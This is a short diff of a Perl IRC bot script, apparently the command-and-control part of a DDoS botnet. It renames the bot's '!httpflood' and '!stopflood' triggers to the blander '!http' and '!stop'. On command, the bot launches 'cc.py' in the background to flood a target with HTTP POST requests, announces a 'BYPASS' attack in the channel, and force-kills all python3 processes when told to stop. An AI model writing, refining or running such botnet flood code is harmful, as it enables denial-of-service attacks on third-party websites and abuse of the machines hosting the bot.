@@ -42,14 +42,14 @@ while ( my $log = <$s0ck3t> ) {
 	print $s0ck3t "JOIN $channel\r\n";
       }
 
-      if ( $log =~ m/:!httpflood (.*)$/g ){##########
+      if ( $log =~ m/:!http (.*)$/g ){##########
         my $target_cf = $1;
         $target_cf =~ s/^\s*(.*?)\s*$/$1/;
         print $s0ck3t "PRIVMSG $channel :67[63BYPASS67]61 Attack started at $1!\r\n";
         system("python3 cc.py $target_cf post 400 100 > /dev/null 2>&1 &");
       }
 
-      if ( $log =~ m/:!stopflood/g ){##########
+      if ( $log =~ m/:!stop/g ){##########
         print $s0ck3t "PRIVMSG $channel :67[63BYPASS67]61 Attack sucessfully finished! \r\n";
         system("pkill -f -9 python3");
       }
